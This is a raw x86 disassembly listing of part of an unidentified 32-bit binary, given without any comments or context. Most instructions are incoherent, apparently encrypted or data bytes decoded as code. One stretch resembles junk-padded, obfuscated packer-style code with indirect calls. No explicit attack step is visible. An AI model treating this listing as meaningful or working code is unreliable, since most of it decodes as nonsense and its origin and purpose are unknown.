  402262:	add    BYTE PTR [ecx-0x3d076a81],cl
  402268:	add    al,0x8c
  40226a:	inc    ebx
  40226b:	loop   0x402298
  40226d:	or     al,0x88
  40226f:	ret    0x4839
  402272:	inc    eax
  402273:	mov    edx,0x96162097
  402278:	arpl   WORD PTR [esi],bp
  40227a:	mov    eax,0x21613948
  40227f:	push   edi
  402280:	add    dh,bh
  402282:	jno    0x4022c1
  402284:	nop
  402285:	dec    esi
  402286:	push   cs
  402287:	dec    esi
  402288:	fnstcw WORD PTR [ebx]
  40228a:	dec    ecx
  40228b:	call   0x93992910
  402290:	xchg   ecx,eax
  402291:	in     al,dx
  402292:	das    
  402293:	cs (bad) 
  402295:	mov    esi,0xa63272d8
  40229a:	fiadd  WORD PTR [ebx]
  40229c:	add    DWORD PTR [edx-0x36],0xffffffef
  4022a0:	jbe    0x4022d8
  4022a2:	sub    ebp,DWORD PTR [ebx+0x6]
  4022a5:	ins    DWORD PTR es:[edi],dx
  4022a6:	pop    es
  4022a7:	fadd   QWORD PTR [edx-0x23a22c4b]
  4022ad:	xchg   edx,eax
  4022ae:	jmp    0x402299
  4022b0:	test   cl,0x4b
  4022b3:	push   cs
  4022b4:	cdq    
  4022b5:	imul   edx,DWORD PTR [edi-0x3fc6001d],0x1c
  4022bc:	into   
  4022bd:	pop    es
  4022be:	popf   
  4022bf:	stc    
  4022c0:	sub    ebx,esp
  4022c2:	je     0x4022be
  4022c4:	and    DWORD PTR [esi*1-0x15ca7c10],ecx
  4022cb:	xchg   edx,eax
  4022cc:	ds loope 0x402270
  4022cf:	cld    
  4022d0:	ins    BYTE PTR es:[edi],dx
  4022d1:	lods   al,BYTE PTR ds:[esi]
  4022d2:	test   BYTE PTR ds:0x7bd254e1,ah
  4022d8:	jecxz  0x402273
  4022da:	or     eax,0xb5692461
  4022df:	lods   eax,DWORD PTR ds:[esi]
  4022e0:	sar    BYTE PTR ds:0x1d39731a,1
  4022e6:	xor    al,BYTE PTR [eax+0x5cde8bfb]
  4022ec:	sub    al,0xdc
  4022ee:	mul    BYTE PTR [edi+0x29]
  4022f1:	aad    0x7f
  4022f3:	inc    eax
  4022f5:	pushf  
  4022f6:	out    dx,eax
  4022f7:	adc    ebp,DWORD PTR [edi+eiz*1]
  4022fa:	cli    
  4022fb:	(bad)  
  4022fc:	stc    
  4022fd:	dec    ecx
  4022fe:	out    dx,eax
  4022ff:	push   ecx
  402300:	dec    edx
  402301:	sbb    ebp,DWORD PTR [ecx]
  402303:	fist   DWORD PTR [ecx]
  402305:	outs   dx,DWORD PTR ds:[esi]
  402306:	jns    0x40228d
  402308:	daa    
  402309:	int    0x46
  40230b:	int    0xd6
  40230d:	aad    0x50
  40230f:	xor    DWORD PTR [edx-0x55],edx
  402312:	and    BYTE PTR [ebx-0x70b30a42],al
  402318:	sti    
  402319:	jb     0x40233b
  40231b:	inc    esi
  40231c:	mov    edi,0x7fd74e3b
  402321:	mov    al,0xd3
  402323:	lock lea ecx,[eax]
  402326:	lea    esi,[esi-0x18]
  402329:	fild   WORD PTR [edx-0x53]
  40232c:	pop    ecx
  40232d:	repnz arpl WORD PTR [esi-0x3c],bp
  402331:	jo     0x40236c
  402333:	push   edi
  402334:	cs cdq 
  402336:	mov    esi,0x7953c7f3
  40233b:	bswap  ecx
  40233d:	dec    esi
  40233e:	daa    
  40233f:	mov    eax,0xdd8e0340
  402344:	jbe    0x4022ce
  402346:	inc    ebp
  402347:	int3   
  402348:	or     dl,BYTE PTR [eax]
  40234a:	push   edx
  40234b:	imul   ebx,DWORD PTR [esi-0x2fb1c0f4],0xa32d1bcd
  402355:	std    
  402356:	or     BYTE PTR [edi-0x36],bh
  402359:	cmp    bh,ch
  40235b:	sar    BYTE PTR [ecx+ebx*8+0x2266c360],cl
  402362:	and    ebx,DWORD PTR [edx]
  402364:	push   ds
  402365:	fadd   QWORD PTR [ecx]
  402367:	lods   eax,DWORD PTR ds:[esi]
  402368:	and    DWORD PTR [ebx+0x286abec7],esi
  40236e:	ficomp DWORD PTR [ecx-0x31e16625]
  402374:	test   BYTE PTR [esi],bl
  402376:	sub    ebx,DWORD PTR [ebp-0x681c593c]
  40237c:	adc    DWORD PTR [edx+0x77],eax
  40237f:	mov    ch,BYTE PTR [edi-0x57]
  402382:	cmp    DWORD PTR [edi],esi
  402384:	aaa    
  402385:	mov    dl,0x53
  402387:	out    0x13,al
  402389:	inc    edi
  40238a:	push   edi
  40238b:	adc    edi,esp
  40238d:	dec    edi
  40238e:	and    dl,ch
  402390:	jge    0xc8e0b646
  402396:	push   ebp
  402397:	inc    edi
  402398:	(bad)  
  40239a:	cmp    ebx,DWORD PTR [eax+0x50]
  40239d:	or     BYTE PTR [eiz*1+0x2d8e656e],bl
  4023a4:	add    ebx,ebx
  4023a6:	mov    cl,0x49
  4023a8:	jle    0x40234b
  4023aa:	dec    ecx
  4023ab:	inc    esi
  4023ac:	jl     0x4023fb
  4023ae:	pop    eax
  4023af:	in     eax,0xcc
  4023b1:	add    BYTE PTR [eax],dh
  4023b3:	jb     0x402424
  4023b5:	xor    DWORD PTR [edi+0x6],0x56
  4023b9:	outs   dx,DWORD PTR ds:[esi]
  4023ba:	mov    bh,0x3c
  4023bc:	loopne 0x4023f8
  4023be:	cs loopne 0x402383
  4023c1:	push   ebx
  4023c2:	mov    ch,0x75
  4023c4:	hlt    
  4023c5:	cmp    eax,0x515fd589
  4023ca:	(bad)  
  4023cb:	ficom  WORD PTR [ebx-0x44]
  4023ce:	in     eax,0x52
  4023d0:	mov    fs,WORD PTR [edx+eax*4+0x6c]
  4023d4:	jle    0x4023f0
  4023d6:	xchg   DWORD PTR [ecx+0xad9c531],esi
  4023dc:	inc    edi
  4023dd:	adc    eax,DWORD PTR [ecx+0xd]
  4023e0:	or     BYTE PTR [ecx+0x3e36bc55],bl
  4023e6:	cmp    DWORD PTR [ebx+0x46],edi
  4023e9:	repz repnz xor DWORD PTR [esi+0x2e],edx
  4023ee:	mov    ecx,esp
  4023f0:	pop    edi
  4023f1:	ret    0x6da2
  4023f4:	cli    
  4023f5:	leave  
  4023f6:	adc    esp,DWORD PTR [edx+0x5a]
  4023f9:	pop    edx
  4023fa:	or     esi,ecx
  4023fc:	fwait
  4023fd:	mov    esi,0xcb050010
  402402:	cdq    
  402403:	jns    0x402459
  402405:	jo     0x402428
  402407:	push   ss
  402408:	mov    esp,0xfd99d1bc
  40240d:	shr    bh,1
  40240f:	rcr    BYTE PTR [ecx],0xc7
  402412:	sbb    dl,BYTE PTR [edi+0x465bd68]
  402418:	sar    BYTE PTR [ebp-0x64],0x10
  40241c:	mov    WORD PTR [ecx],?
  40241e:	loopne 0x402435
  402420:	pop    edx
  402421:	inc    esp
  402422:	cs pop ebp
  402424:	mov    ch,0xda
  402426:	push   esp
  402427:	cs sar ebx,cl
  40242a:	sub    bh,BYTE PTR ds:[edx-0x69]
  40242e:	add    al,0x74
  402430:	cmp    al,BYTE PTR [ecx+0x58735e0b]
  402436:	fnstenv [eax-0x68]
  402439:	xchg   ecx,eax
  40243b:	sbb    ebp,ebx
  40243d:	sbb    al,0x80
  40243f:	daa    
  402440:	stos   BYTE PTR es:[edi],al
  402441:	ret    
  402442:	shr    BYTE PTR [ecx],0xf1
  402445:	mov    eax,edi
  402447:	es scas al,BYTE PTR es:[edi]
  402449:	outs   dx,BYTE PTR ds:[esi]
  40244a:	fcom   DWORD PTR [eax-0x30ba0f65]
  402450:	clc    
  402451:	mov    ds:0x96c11095,eax
  402456:	dec    edi
  402457:	popf   
  402458:	cmp    al,0xc6
  40245a:	sbb    bh,BYTE PTR [esi+0x1f]
  40245d:	sub    DWORD PTR [edx+0x67],esp
  402460:	jp     0x40240b
  402462:	mov    bh,0x8f
  402464:	jbe    0x40246c
  402466:	jl     0x4023f3
  402468:	jle    0x402426
  40246a:	pushf  
  40246b:	rol    DWORD PTR [ecx*8-0x6a327675],cl
  402472:	stc    
  402473:	rol    BYTE PTR [bp+si],0x5e
  402477:	psubb  mm6,QWORD PTR [esi-0x202e553]
  40247e:	push   0x6ca89410
  402483:	xor    DWORD PTR [ebx+0x222c1402],eax
  402489:	push   ds
  40248a:	or     al,0x4f
  40248c:	add    BYTE PTR [ebp-0x7732a505],dh
  402492:	aaa    
  402493:	mov    al,0x16
  402495:	js     0x4024e6
  402497:	cwde   
  402498:	(bad)  
  40249b:	rcr    edi,cl
  40249d:	scas   al,BYTE PTR es:[edi]
  40249e:	scas   eax,DWORD PTR es:[edi]
  40249f:	dec    ecx
  4024a0:	mov    edi,DWORD PTR [ebp+0x1d]
  4024a3:	outs   dx,BYTE PTR ds:[esi]
  4024a4:	mov    DWORD PTR [edx],esi
  4024a6:	je     0x402468
  4024a8:	dec    ebx
  4024a9:	pop    ecx
  4024aa:	clc    
  4024ab:	fidiv  WORD PTR [eax-0x2]
  4024ae:	dec    esp
  4024af:	mov    al,ds:0x180e9033
  4024b4:	mov    ch,0xe4
  4024b6:	cmp    dh,BYTE PTR [ecx]
  4024b8:	aad    0x8e
  4024ba:	adc    al,0xec
  4024bc:	jb     0x4024df
  4024be:	cli    
  4024bf:	push   es
  4024c0:	ja     0x4024da
  4024c2:	aam    0x2d
  4024c4:	xchg   edi,eax
  4024c5:	or     edi,DWORD PTR [ecx+eax*4+0x3f9cc6e1]
  4024cc:	mov    dh,0xae
  4024ce:	and    cl,BYTE PTR [edx+0x754426c3]
  4024d4:	popf   
  4024d5:	scas   eax,DWORD PTR es:[edi]
  4024d6:	(bad)  
  4024d7:	int3   
  4024d8:	loope  0x40251a
  4024da:	jl     0x4024a8
  4024dc:	pop    ecx
  4024dd:	mov    ebx,0x90a4469a
  4024e2:	fdivr  DWORD PTR [edx+0x2f88b8a1]
  4024e8:	mov    WORD PTR [eax],ds
  4024ea:	out    0x5,al
  4024ec:	jle    0x402470
  4024ee:	jmp    0x402568
  4024f0:	dec    esi
  4024f1:	test   DWORD PTR [eax-0x122ce48f],0x11da6698
  4024fb:	dec    ebx
  4024fc:	les    eax,FWORD PTR [edx+0x37]
  4024ff:	ja     0x40253b
  402501:	fldenv [edx-0x7d]
  402504:	jmp    0x40250e
  402506:	and    edx,ecx
  402508:	inc    ebx
  402509:	outs   dx,BYTE PTR ds:[esi]
  40250a:	mov    esp,0x83d1c858
  40250f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402510:	adc    eax,0xed6993ee
  402515:	xchg   ebx,eax
  402516:	add    al,BYTE PTR [eax+0x2b]
  402519:	ja     0x40251b
  40251b:	(bad)  
  40251d:	xchg   esi,eax
  40251e:	fild   QWORD PTR [ecx+eiz*8]
  402521:	pop    esp
  402522:	int3   
  402523:	gs clc 
  402525:	loopne 0x40259f
  402527:	xor    eax,0xc950e8e9
  40252c:	adc    al,0x5e
  40252e:	mov    ah,ch
  402530:	fstp   QWORD PTR [eax-0x9]
  402533:	push   0x3e
  402535:	jecxz  0x40257e
  402537:	cmc    
  402538:	out    dx,eax
  402539:	xchg   ebx,eax
  40253a:	xor    DWORD PTR [edi+0x2e5a2a11],eax
  402540:	lds    ebp,FWORD PTR [edx-0x2889389e]
  402546:	js     0x4025c5
  402548:	ret    
  402549:	push   eax
  40254a:	data16 sahf 
  40254c:	push   ebx
  40254d:	jno    0x40258d
  40254f:	rcl    DWORD PTR ds:0x559a3902,0x52
  402556:	push   ebx
  402557:	ror    DWORD PTR [ecx+edx*2+0x64],1
  40255b:	adc    al,BYTE PTR [edi+ebp*2-0x51]
  40255f:	push   edi
  402560:	sbb    DWORD PTR [ecx-0xa],0xab678d3b
  402567:	out    0x10,eax
  402569:	addr16 and al,0x86
  40256c:	or     DWORD PTR [bx+si+0x5757],ecx
  402571:	inc    edi
  402572:	(bad)  
  402573:	pop    ss
  402574:	xchg   ecx,eax
  402575:	dec    ebx
  402576:	pop    ecx
  402577:	or     edi,DWORD PTR [ebx-0x3b]
  40257a:	cmp    al,0xba
  40257c:	xlat   BYTE PTR ds:[ebx]
  40257d:	sub    BYTE PTR [ecx+esi*4],al
  402580:	test   al,0x3a
  402582:	ja     0x40258e
  402584:	mov    ch,0x32
  402586:	adc    ebx,DWORD PTR [edx+eiz*4-0x51294fa2]
  40258d:	arpl   bp,bp
  40258f:	mov    esi,0x30270afb
  402594:	sbb    al,0xa9
  402596:	int    0x5d
  402598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402599:	adc    dl,BYTE PTR [ebx-0x26]
  40259c:	rol    DWORD PTR [ebp+0x78d94277],cl
  4025a2:	mov    edx,0x2b7dd2d2
  4025a7:	jmp    0xdd22741
  4025ac:	psubd  mm5,QWORD PTR [esi-0x5b2464af]
  4025b3:	scas   al,BYTE PTR es:[edi]
  4025b4:	dec    edi
  4025b5:	rol    BYTE PTR [edi+0x3e],cl
  4025b8:	add    BYTE PTR [ecx],0xa1
  4025bb:	xchg   edx,eax
  4025bc:	sub    edx,DWORD PTR [esi+0x7d]
  4025bf:	out    dx,al
  4025c0:	jmp    0xb028:0x11f7247f
  4025c7:	scas   al,BYTE PTR es:[di]
  4025c9:	(bad)  [ecx]
  4025cb:	push   ss
  4025cc:	sbb    esp,edi
  4025ce:	mov    DWORD PTR [ebp-0x70],0x3b72
  4025d5:	movzx  eax,WORD PTR ds:0x42830f
  4025dc:	adc    DWORD PTR ds:0x42819b,eax
  4025e2:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4025e9:	adc    DWORD PTR ds:0x428183,edi
  4025ef:	mov    DWORD PTR [ebp-0x68],0x1b45
  4025f6:	cmp    DWORD PTR ds:0x428177,0x0
  4025fd:	mov    DWORD PTR ds:0x428323,0x76b5
  402607:	mov    DWORD PTR ds:0x42817f,edx
  40260d:	mov    DWORD PTR ds:0x428297,0x4dfd
  402617:	jmp    0x40267d
  40261c:	mov    eax,ds:0x428283
  402621:	mov    eax,0x8f5
  402626:	cmp    DWORD PTR ds:0x428177,0x0
  40262d:	ja     0x402669
  402633:	push   DWORD PTR [ebp-0x14]
  402636:	push   0x1475
  40263b:	push   0x3d07
  402640:	push   0x42824f
  402645:	call   DWORD PTR ds:0x428dac
  40264b:	sbb    DWORD PTR ds:0x42839b,0x36f
  402655:	adc    DWORD PTR ds:0x42831f,0x4281a7
  40265f:	sub    DWORD PTR ds:0x42838f,0x42832b
  402669:	and    DWORD PTR ds:0x42816f,0x42825b
  402673:	add    DWORD PTR ds:0x42832f,0x6611
  40267d:	mov    DWORD PTR [ebp-0x64],0x767d
  402684:	sub    eax,DWORD PTR ds:0x428177
  40268a:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402691:	mov    DWORD PTR [ebp-0x5c],0x0
  402698:	add    DWORD PTR ds:0x42816b,0x47ea
  4026a2:	mov    DWORD PTR [ebp-0x34],0x599d
  4026a9:	mov    DWORD PTR [ebp-0x2c],0x165d
  4026b0:	cmp    DWORD PTR ds:0x42829f,0x0
  4026b7:	mov    DWORD PTR ds:0x4282ff,edx
  4026bd:	mov    DWORD PTR ds:0x42825b,ecx
  4026c3:	mov    DWORD PTR ds:0x428183,edx
  4026c9:	mov    DWORD PTR ds:0x42827f,0x4bd1
  4026d3:	jmp    0x402743
  4026d8:	mov    eax,ds:0x42816b
  4026dd:	mov    DWORD PTR ds:0x42829f,edx
  4026e3:	cmp    DWORD PTR ds:0x42829f,0x0
  4026ea:	jg     0x402726
  4026f0:	push   DWORD PTR [ebp-0x28]
  4026f3:	push   0x2b2a
  4026f8:	push   0x1aa6
  4026fd:	push   0x3603
  402702:	call   DWORD PTR ds:0x428db0
  402708:	add    DWORD PTR ds:0x4282a7,0x428307
  402712:	sub    DWORD PTR ds:0x428323,0x6e4a
  40271c:	xor    DWORD PTR ds:0x42817b,0x16a6
  402726:	dec    DWORD PTR ds:0x428197
  40272c:	and    DWORD PTR ds:0x42827b,edx
  402732:	or     DWORD PTR ds:0x42830b,edx
  402738:	mov    eax,ds:0x42819f
  40273d:	and    DWORD PTR ds:0x4283b3,eax
  402743:	mov    DWORD PTR [ebp-0x1c],0xc51
  40274a:	movzx  eax,WORD PTR ds:0x4283b3
  402751:	sbb    DWORD PTR ds:0x42827f,eax
  402757:	mov    DWORD PTR [ebp-0x44],0x3f55
  40275e:	or     eax,0x5124
  402763:	mov    DWORD PTR [ebp-0x44],0x1
  40276a:	adc    DWORD PTR ds:0x42825f,0x6ac9
  402774:	mov    DWORD PTR [ebp-0x44],0x42e8
  40277b:	mov    eax,DWORD PTR [ebp-0x60]
  40277e:	dec    DWORD PTR ds:0x428313
  402784:	shl    ecx,0x1e
  402787:	not    ecx
  402789:	mov    ecx,DWORD PTR [ebp-0x5c]
  40278c:	jmp    0x402b6a
  402791:	out    dx,eax
  402792:	repz (bad) 
  402794:	cmp    bh,BYTE PTR [ebx+0x63226a1a]
  40279a:	pop    ds
  40279b:	and    eax,0x4324e8aa
  4027a0:	push   0x30
  4027a2:	cld    
  4027a3:	sbb    BYTE PTR [eax],bl
  4027a5:	sahf   
  4027a6:	adc    bl,BYTE PTR [eax]
  4027a8:	sbb    BYTE PTR [esi+0x31],bh
  4027ab:	(bad)  
  4027ac:	es pusha 
  4027ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027af:	jmp    0x4027b6
  4027b1:	sub    eax,DWORD PTR [ecx]
  4027b3:	lods   al,BYTE PTR ds:[esi]
  4027b4:	push   ecx
  4027b5:	mov    esi,DWORD PTR [ebp+edx*8-0x1edd772a]
  4027bc:	and    DWORD PTR [ecx-0x595e60c1],edx
  4027c2:	cmp    eax,0x7e0c60f6
  4027c7:	mov    cl,0x9c
  4027c9:	push   edx
  4027ca:	dec    ebx
  4027cb:	lods   al,BYTE PTR ds:[esi]
  4027cc:	out    0x8f,al
  4027ce:	in     al,dx
  4027cf:	inc    esi
  4027d0:	mov    ds:0x3d1143a9,eax
  4027d5:	shl    BYTE PTR [ecx],0x7
  4027d8:	rcl    DWORD PTR [edx],1
  4027da:	rcr    al,cl
  4027dc:	push   0xffffff8f
  4027de:	mov    dl,0x20
  4027e0:	inc    edi
  4027e1:	adc    ebx,edx
  4027e3:	cdq    
  4027e4:	or     DWORD PTR [edi-0x61],0xe8725e9f
  4027eb:	push   es
  4027ec:	pop    ss
  4027ed:	pop    esi
  4027ee:	xchg   edi,eax
  4027ef:	loop   0x402773
  4027f1:	mov    eax,0x6d573781
  4027f6:	stos   BYTE PTR es:[edi],al
  4027f7:	shl    BYTE PTR [ecx],1
  4027f9:	sbb    ch,BYTE PTR [esi+0x4062c5d8]
  4027ff:	mov    eax,ds:0xfa5a776b
  402804:	sub    DWORD PTR [ebx],edx
  402806:	sub    BYTE PTR [edx-0x26],0xcc
  40280a:	in     eax,0x55
  40280c:	icebp  
  40280d:	mov    ebx,0xbf0e106c
  402812:	cmp    edi,DWORD PTR [esi-0x5c]
  402815:	out    0xae,eax
  402817:	mov    dl,0x29
  402819:	fs fwait
  40281b:	sbb    ch,BYTE PTR [esi]
  40281d:	stc    
  40281e:	xor    ebx,DWORD PTR [ecx]
  402820:	stos   BYTE PTR es:[edi],al
  402821:	xor    ch,BYTE PTR [esi+ebp*8+0x326b0b4]
  402828:	popa   
  402829:	cmp    eax,ecx
  40282b:	pop    edx
  40282c:	stos   BYTE PTR es:[edi],al
  40282d:	pushf  
  40282e:	lods   al,BYTE PTR ds:[esi]
  40282f:	mov    dh,0xa0
  402831:	js     0x402876
  402833:	rcr    BYTE PTR [esi-0x69],0xd2
  402837:	out    0x89,eax
  402839:	push   ebp
  40283a:	test   al,0xbd
  40283c:	lea    edx,[ebx+eiz*4+0x70]
  402840:	sbb    edx,esp
  402842:	jbe    0x402828
  402844:	leave  
  402845:	ret    
  402846:	int    0xb2
  402848:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402849:	or     DWORD PTR [ecx+0x13],0xffffffbf
  40284d:	sbb    al,0x4f
  40284f:	in     al,0x7d
  402851:	mov    ds:0xe8798cf8,eax
  402856:	fcomp  QWORD PTR [edx+0x62]
  402859:	cmp    ah,BYTE PTR [eax+0x33542a01]
  40285f:	jno    0x402808
  402861:	arpl   WORD PTR [ebp+0x20],di
  402864:	inc    eax
  402865:	mov    ebx,0xf7df6d4d
  40286a:	add    eax,0xdf5ccddb
  40286f:	push   0xffffffbc
  402871:	adc    BYTE PTR [edx+0x47],cl
  402874:	xchg   esi,eax
  402875:	cmp    eax,DWORD PTR [esi-0x2a]
  402878:	adc    bh,dh
  40287a:	fdivr  st(1),st
  40287c:	fisttp DWORD PTR [edx-0x3d]
  40287f:	pop    esp
  402880:	lds    esp,FWORD PTR [edx+0x24]
  402883:	mov    eax,0x20688313
  402888:	ret    
  402889:	fldcw  WORD PTR [ecx]
  40288b:	mov    bh,0x61
  40288d:	loope  0x4028f8
  40288f:	rcr    BYTE PTR [esi+0x34b9f0af],1
  402895:	adc    dh,bh
  402897:	sub    bl,BYTE PTR [edi-0x32a13c5d]
  40289d:	add    ebx,DWORD PTR [esi]
  40289f:	jb     0x4028d3
  4028a1:	aaa    
  4028a2:	iret   
  4028a3:	push   es
  4028a4:	and    eax,0x9b70108d
  4028a9:	cmp    al,0x5
  4028ab:	test   BYTE PTR [eax-0x1bdcd1e],dh
  4028b1:	jmp    0x5b5dbee2
  4028b6:	mov    edx,0xdaf6c961
  4028bb:	pop    edx
  4028bc:	jae    0x402856
  4028be:	cmp    BYTE PTR [eax+0x1],al
  4028c1:	mov    DWORD PTR [ecx-0x66456082],0xa877866a
  4028cb:	cdq    
  4028cc:	sbb    ah,BYTE PTR [esi]
  4028ce:	pop    ebx
  4028cf:	fs int3 
  4028d1:	test   al,0xcf
  4028d3:	loope  0x40290f
  4028d5:	sub    ebx,DWORD PTR [esi-0x13463c61]
  4028db:	(bad)  
  4028dc:	scas   al,BYTE PTR es:[edi]
  4028dd:	(bad)  
  4028de:	es xor eax,0x2621d830
  4028e4:	popf   
  4028e5:	jg     0x325a5a0f
  4028eb:	sub    eax,0x556b8c51
  4028f0:	call   0x7a9061b5
  4028f5:	retf   0x8566
  4028f8:	ins    BYTE PTR es:[edi],dx
  4028f9:	jae    0x4028b4
  4028fb:	rcl    DWORD PTR gs:[ebx-0x1],cl
  4028ff:	mov    eax,0xe65c803f
  402904:	lahf   
  402905:	ds pop ebp
  402907:	sub    al,0xc7
  402909:	mov    cl,0x4e
  40290b:	jl     0x4028ff
  40290d:	inc    edx
  40290e:	add    eax,0xbc85c362
  402913:	int3   
  402914:	push   0xf997b4ea
  402919:	sub    DWORD PTR [edx],eax
  40291b:	in     al,dx
  40291c:	sti    
  40291d:	imul   eax,DWORD PTR [eax-0x5f34b52e],0xffffffb9
  402924:	js     0x402984
  402926:	push   esi
  402927:	repnz add edi,DWORD PTR [ebx+0x3f222766]
  40292e:	adc    al,0xe2
  402930:	add    BYTE PTR [esi+0x4348a461],ah
  402936:	int3   
  402937:	jns    0x402900
  402939:	push   ebx
  40293a:	loopne 0x40291a
  40293c:	mov    ds:0xa459d57d,al
  402941:	stos   DWORD PTR es:[edi],eax
  402942:	sti    
  402943:	ret    
  402944:	or     BYTE PTR [edx+edi*8],cl
  402947:	sub    eax,0x595d77f5
  40294c:	clc    
  40294d:	shl    cl,0x66
  402950:	aaa    
  402951:	mov    edi,0x9b3f8487
  402956:	popa   
  402957:	lahf   
  402958:	or     BYTE PTR [edx-0x437e24f5],0x6e
  40295f:	pushf  
  402960:	cmp    DWORD PTR [edx+esi*1-0x2f9dca12],eax
  402967:	push   es
  402968:	add    al,0xf
  40296a:	jnp    0x4029c7
  40296c:	adc    BYTE PTR [edx-0x6748a298],dl
  402972:	stos   DWORD PTR es:[edi],eax
  402973:	cmp    DWORD PTR [eax-0xb587aad],edx
  402979:	mov    ebp,0x36f565f1
  40297e:	pop    edi
  40297f:	dec    edx
  402980:	sub    eax,eax
  402982:	sar    BYTE PTR [edx],1
  402984:	inc    ebx
  402985:	sub    DWORD PTR [ecx-0x1c11a6b3],edi
  40298b:	repnz pop ebp
  40298d:	add    DWORD PTR [edx+0x2af6f208],ecx
  402993:	out    dx,al
  402994:	xchg   ebp,eax
  402995:	push   0xd501a39d
  40299a:	sar    BYTE PTR [ecx+0x10],1
  40299d:	shl    DWORD PTR [ebx],1
  40299f:	cmp    BYTE PTR [ecx-0x3f5078af],al
  4029a5:	js     0x4029a1
  4029a7:	mov    esp,0xa4b321fd
  4029ac:	sti    
  4029ad:	pop    es
  4029ae:	sbb    eax,0x232c0e85
  4029b3:	call   0x13ca:0x4d81f9a1
  4029ba:	cdq    
  4029bb:	mov    dl,cl
  4029bd:	lods   al,BYTE PTR ds:[esi]
  4029be:	ins    BYTE PTR es:[edi],dx
  4029bf:	inc    ecx
  4029c0:	jb     0x402983
  4029c2:	jbe    0x4029b3
  4029c4:	not    dl
  4029c6:	jae    0x4029d9
  4029c8:	lgs    edi,FWORD PTR [ecx+0x13]
  4029cc:	xchg   esi,eax
  4029cd:	(bad)  
  4029ce:	fmul   DWORD PTR [ebx+0x76]
  4029d1:	ds inc esp
  4029d3:	fidiv  DWORD PTR [ecx+edi*2]
  4029d6:	pop    esi
  4029d7:	(bad)  
  4029d8:	lock mov esp,edx
  4029db:	sbb    al,0x4d
  4029dd:	scas   eax,DWORD PTR es:[edi]
  4029de:	test   al,0xea
  4029e0:	inc    esp
  4029e1:	cmp    eax,DWORD PTR fs:[edi+0x24]
  4029e5:	sub    bl,BYTE PTR [eax]
  4029e7:	jnp    0x4029ef
  4029e9:	popa   
  4029ea:	mov    al,0xcf
  4029ec:	xor    eax,0xab1f1312
  4029f1:	jns    0x402977
  4029f3:	outs   dx,DWORD PTR ds:[esi]
  4029f4:	(bad)  
  4029f5:	mov    eax,0xbd142788
  4029fa:	shl    DWORD PTR [esi+edx*8-0x652d3986],1
  402a01:	push   esi
  402a02:	(bad)  
  402a03:	ins    DWORD PTR es:[edi],dx
  402a04:	jmp    0x402a82
  402a06:	aaa    
  402a07:	cwde   
  402a08:	mov    bh,BYTE PTR [edi+0x27]
  402a0b:	lods   eax,DWORD PTR ds:[esi]
  402a0c:	mov    cl,0xa2
  402a0e:	cli    
  402a0f:	or     bh,cl
  402a11:	lds    edi,FWORD PTR [edx-0x5409c7a6]
  402a17:	jnp    0x402a8c
  402a19:	jge    0x402a52
  402a1b:	mov    ecx,0x31bdaa49
  402a20:	mov    ch,0xdd
  402a22:	bound  esp,QWORD PTR [edi-0x15]
  402a25:	ds (bad) 
  402a28:	xchg   esp,eax
  402a29:	sbb    eax,0x172619ae
  402a2e:	jge    0x402aaf
  402a30:	xchg   edx,eax
  402a31:	cmp    bh,BYTE PTR [edx-0x47]
  402a34:	sbb    al,0x1e
  402a36:	mov    BYTE PTR [ecx+0x6d3168d0],bh
  402a3c:	xchg   edx,eax
  402a3d:	(bad)  
  402a3e:	jmp    0x4029db
  402a40:	and    eax,0x2ba85304
  402a45:	int    0x16
  402a47:	stos   DWORD PTR es:[edi],eax
  402a48:	fldenv [edx+0x59e9e9ba]
  402a4e:	rol    DWORD PTR [ebp+0x68b371f1],0xa3
  402a55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a56:	es sbb al,0x30
  402a59:	into   
  402a5a:	call   FWORD PTR [edi+0x36]
  402a5d:	mov    cl,0xd9
  402a5f:	jge    0x402a42
  402a61:	int    0x1a
  402a63:	xchg   ebp,eax
  402a64:	test   eax,0x4c8f8e49
  402a69:	loope  0x402ad9
  402a6b:	(bad)  
  402a6c:	mov    ds:0x14c80ac2,eax
  402a71:	nop
  402a72:	push   ebp
  402a73:	jae    0x402aac
  402a75:	popf   
  402a76:	mov    al,0xfa
  402a78:	mov    ah,0xf
  402a7a:	cmc    
  402a7b:	arpl   WORD PTR [ecx],dx
  402a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a7e:	mov    ds:0xef34ac9f,al
  402a83:	test   eax,0x69f43e44
  402a88:	sbb    al,0xe4
  402a8a:	jp     0x402a51
  402a8c:	jl     0x402b00
  402a8e:	in     al,0xf4
  402a90:	rcl    ebp,1
  402a92:	or     BYTE PTR [edi-0x1e59c095],0xc3
  402a99:	outs   dx,DWORD PTR ds:[esi]
  402a9a:	adc    al,0xbc
  402a9c:	jecxz  0x402b1a
  402a9e:	xchg   BYTE PTR [esi-0x2791f0d8],bh
  402aa4:	pop    esp
  402aa5:	mov    ecx,0xd629133d
  402aaa:	adc    eax,0xdc4bdad
  402aaf:	mov    dl,0xcc
  402ab1:	jae    0x402a8b
  402ab3:	mov    esp,0xcf83e5ed
  402ab8:	jl     0x402aff
  402aba:	mov    bh,0x77
  402abc:	mov    cs,WORD PTR [ebx]
  402abe:	dec    eax
  402abf:	push   edx
  402ac0:	push   eax
  402ac1:	es sbb eax,0x1527b36a
  402ac7:	aas    
  402ac8:	into   
  402ac9:	retf   
  402aca:	sub    esp,edx
  402acc:	(bad)  
  402acd:	cli    
  402ace:	push   0x966a1406
  402ad3:	ror    cl,cl
  402ad5:	xchg   ebp,eax
  402ad6:	sbb    BYTE PTR [edx-0x7c2555c3],ah
  402adc:	sahf   
  402add:	std    
  402ade:	sub    al,0xe5
  402ae0:	push   ebx
  402ae1:	cwde   
  402ae2:	push   edx
  402ae3:	sub    eax,0xca7f1021
  402ae8:	and    DWORD PTR [ebx+eiz*8+0x13ec3de9],esp
  402aef:	jae    0x402abd
  402af1:	out    dx,eax
  402af2:	stos   DWORD PTR es:[edi],eax
  402af3:	add    eax,DWORD PTR [ebx]
  402af5:	(bad)  
  402af6:	xor    eax,0x994d9f48
  402afb:	(bad)  
  402afc:	mov    al,ds:0x1019e482
  402b01:	scas   al,BYTE PTR es:[edi]
  402b02:	inc    esp
  402b03:	popf   
  402b04:	mov    cl,0x83
  402b06:	(bad)  
